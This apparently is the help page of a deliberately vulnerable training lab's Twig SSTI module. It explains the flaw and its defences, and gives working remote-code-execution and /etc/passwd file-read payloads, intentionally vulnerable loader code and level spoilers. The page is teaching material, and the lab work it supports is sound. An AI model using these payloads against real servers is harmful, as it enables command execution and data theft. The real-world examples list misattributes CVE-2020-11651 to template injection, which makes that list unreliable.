<div class="body_padded">
	<h1>Help - Server-Side Template Injection (SSTI)</h1>

	<div id="code">
		<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
			<tr>
				<td><div id="code">
					<h3>About</h3>
					<p>Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is embedded into a template in an unsafe manner, allowing an attacker to inject template directives and potentially execute arbitrary code on the server.</p>
					
					<p>This module uses <strong>Twig template engine</strong>, a popular PHP templating library. When user input is rendered directly as a Twig template (using Twig_Loader_String), attackers can inject Twig syntax to access internal objects, execute functions, and achieve Remote Code Execution.</p>

					<h3>How SSTI Works in Twig</h3>
					<p>Twig uses special syntax for template operations:</p>
					<ul>
						<li><strong>Variables:</strong> <code>{{ variable }}</code> - Output escaped content</li>
						<li><strong>Expressions:</strong> <code>{{ 7*7 }}</code> - Evaluate mathematical expressions</li>
						<li><strong>Filters:</strong> <code>{{ name|upper }}</code> - Apply filters to variables</li>
						<li><strong>Functions:</strong> <code>{{ dump() }}</code> - Call Twig functions</li>
						<li><strong>Control structures:</strong> <code>{% if condition %} ... {% endif %}</code></li>
					</ul>
					<p>When user input is processed by <code>Twig_Loader_String()</code> and rendered directly, attackers can access the <code>_self</code> object to reach PHP's internal functions and execute arbitrary code.</p>

					<h3>Twig SSTI Attack Chain</h3>
					<p>Exploitation typically follows this pattern:</p>
					<ol>
						<li>Detect template injection: <code>{{ 7*7 }}</code> (returns 49)</li>
						<li>Access environment object: <code>{{_self}}</code></li>
						<li>Get environment methods: <code>{{_self.env}}</code></li>
						<li>Register callback: <code>{{_self.env.registerUndefinedFilterCallback("exec")}}</code></li>
						<li>Execute command: <code>{{_self.env.getFilter("whoami")}}</code></li>
					</ol>

					<h3>Common Twig SSTI Payloads</h3>
					<p><strong>Detection:</strong></p>
					<pre>{{7*7}}                    # Should return 49
{{7*'7'}}                  # Should return 7777777
{{_self}}                  # Access template object</pre>

					<p><strong>RCE via getFilter (Twig 1.x):</strong></p>
					<pre>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}</pre>

					<p><strong>RCE via map filter:</strong></p>
					<pre>{{["id"]|map("system")|join}}
{{["whoami"]|filter("system")|join}}
{{["ls -la"]|reduce("system")|join}}</pre>

					<p><strong>File reading:</strong></p>
					<pre>{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("/etc/passwd")}}</pre>

					<h3>Impact</h3>
					<ul>
						<li><strong>Remote Code Execution (RCE):</strong> Execute arbitrary OS commands</li>
						<li><strong>File System Access:</strong> Read/write sensitive files</li>
						<li><strong>Information Disclosure:</strong> Access PHP configuration, environment</li>
						<li><strong>Server Takeover:</strong> Complete compromise via reverse shells</li>
						<li><strong>Data Exfiltration:</strong> Access databases and internal systems</li>
					</ul>

					<br /><hr /><br />

					<h3>Objective</h3>
					<p>Your goal is to exploit the SSTI vulnerability to:</p>
					<ul>
						<li><strong>Low:</strong> Execute code using Twig_Loader_String without restrictions</li>
						<li><strong>Medium:</strong> Bypass basic blacklist of dangerous Twig keywords</li>
						<li><strong>High:</strong> Bypass extensive blacklist including template syntax</li>
						<li><strong>Impossible:</strong> Understand proper template security with Twig_Loader_Array</li>
					</ul>

					<br /><hr /><br />

					<h3>Low Level</h3>
					<p>The low level uses <code>Twig_Loader_String()</code> to render user input directly as a Twig template without any filtering or validation.</p>
					<p><strong>Vulnerable code:</strong></p>
					<pre>$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
$result = $twig->render($name);  // User input rendered as template!</pre>
					<p><em>Spoiler:</em> <span class="spoiler">Try: {{7*7}} to confirm SSTI. Then use: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} or {{["whoami"]|map("system")|join}} or {{["ls"]|filter("system")|join}}</span></p>

					<br />

					<h3>Medium Level</h3>
					<p>The medium level implements a basic blacklist blocking: _self, env, app, map, filter, reduce.</p>
					<p>Still uses <code>Twig_Loader_String()</code> making it vulnerable with creative bypasses.</p>
					<p><em>Spoiler:</em> <span class="spoiler">The blacklist blocks common SSTI keywords but Twig has many attack vectors. Try alternative approaches like using sort filter, or encoding techniques. Research Twig-specific bypasses like {% %} syntax or accessing objects differently.</span></p>

					<br />

					<h3>High Level</h3>
					<p>The high level blocks template syntax ({{, }}, {%, %}) and common keywords (_self, env, map, filter, reduce, sort, registerUndefinedFilterCallback, getFilter, setCache).</p>
					<p>Uses POST method with CSRF token and still renders with <code>Twig_Loader_String()</code>.</p>
					<p><em>Spoiler:</em> <span class="spoiler">Template syntax is blocked in input validation, making direct Twig injection very difficult. This level demonstrates that even extensive blacklists may have bypasses. In real scenarios, you might try encoding, using less common Twig features, or finding parser quirks.</span></p>

					<br />

					<h3>Impossible Level</h3>
					<p>The impossible level properly prevents SSTI by using <strong>Twig_Loader_Array</strong> instead of Twig_Loader_String:</p>
					<ul>
						<li>Uses CSRF token protection</li>
						<li><strong>Predefined templates</strong> loaded via Twig_Loader_Array</li>
						<li><strong>User input passed as DATA</strong>, not as template</li>
						<li>Autoescape enabled for HTML safety</li>
						<li>Strict input validation with regex whitelist</li>
						<li>Strict variables mode enabled</li>
					</ul>
					<p><strong>Secure code:</strong></p>
					<pre>$loader = new Twig_Loader_Array(array(
    'greeting' => 'Hello, {{ name }}! Welcome to our site.'
));
$twig = new Twig_Environment($loader, array('autoescape' => 'html'));
// User input is DATA, not template
$result = $twig->render('greeting', array('name' => $name));</pre>
					<p>This approach ensures user input is treated as data, never as executable template code.</p>

					<br />

					<h3>Defense Strategies</h3>
					<ul>
						<li><strong>Use Twig_Loader_Array:</strong> Never use Twig_Loader_String with user input</li>
						<li><strong>Separate templates from data:</strong> Always pass user input as template variables, not as templates</li>
						<li><strong>Enable sandbox mode:</strong> Use Twig's sandbox extension to restrict available functions</li>
						<li><strong>Enable autoescape:</strong> Set autoescape to 'html' to prevent XSS</li>
						<li><strong>Strict variables:</strong> Enable strict_variables to catch undefined variable access</li>
						<li><strong>Whitelist allowed tags/filters:</strong> Define allowed Twig tags, filters, and functions</li>
						<li><strong>Input validation:</strong> Validate and sanitize all user input before passing to templates</li>
						<li><strong>Update Twig regularly:</strong> Keep Twig library updated to latest version</li>
						<li><strong>Code review:</strong> Audit all template rendering code for unsafe patterns</li>
						<li><strong>Least privilege:</strong> Run application with minimal system permissions</li>
					</ul>

					<br />

					<h3>Secure Twig Configuration</h3>
					<pre>// SECURE: Use array loader with predefined templates
$loader = new Twig_Loader_Array(array(
    'greeting' => 'Hello, {{ name }}! Welcome to our site.'
));

$twig = new Twig_Environment($loader, array(
    'autoescape' => 'html',           // Auto-escape HTML
    'strict_variables' => true,       // Catch undefined vars
    'debug' => false                  // Disable debug in production
));

// Pass user input as DATA, not template
$output = $twig->render('greeting', array(
    'name' => $sanitizedUserInput
));</pre>

					<br />

					<h3>Testing for Twig SSTI</h3>
					<ul>
						<li><strong>Basic detection:</strong> {{7*7}} should return 49, not literal string</li>
						<li><strong>String multiplication:</strong> {{7*'7'}} returns 7777777</li>
						<li><strong>Self object:</strong> {{_self}} to access template object</li>
						<li><strong>Environment access:</strong> {{_self.env}} to access Twig environment</li>
						<li><strong>RCE via registerUndefinedFilterCallback:</strong> {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}</li>
						<li><strong>Map filter:</strong> {{["id"]|map("system")|join}}</li>
						<li><strong>Filter filter:</strong> {{["whoami"]|filter("system")|join}}</li>
						<li><strong>Reading files:</strong> Use file_get_contents as callback</li>
						<li><strong>Try various filters:</strong> |sort, |reduce, |batch, etc.</li>
					</ul>

					<br />

					<h3>Real-world SSTI Examples</h3>
					<ul>
						<li><strong>Uber (2016):</strong> Jinja2 SSTI in Python leading to RCE ($10,000 bounty)</li>
						<li><strong>Shopify (2017):</strong> ERB template injection in Ruby ($10,000 bounty)</li>
						<li><strong>Atlassian (2019):</strong> Velocity template injection in Java</li>
						<li><strong>SaltStack (2020):</strong> Jinja2 SSTI leading to CVE-2020-11651</li>
						<li><strong>Various CTF challenges:</strong> Twig SSTI is common in web exploitation challenges</li>
					</ul>

					<br />

					<h3>References</h3>
					<ul>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection', 'OWASP - SSTI Testing Guide' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/research/server-side-template-injection', 'PortSwigger - SSTI Research' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/web-security/server-side-template-injection', 'PortSwigger - SSTI' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection', 'HackTricks - SSTI' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection', 'PayloadsAllTheThings - SSTI' ); ?></li>
					</ul>
				</div></td>
			</tr>
		</table>
	</div>
</div>
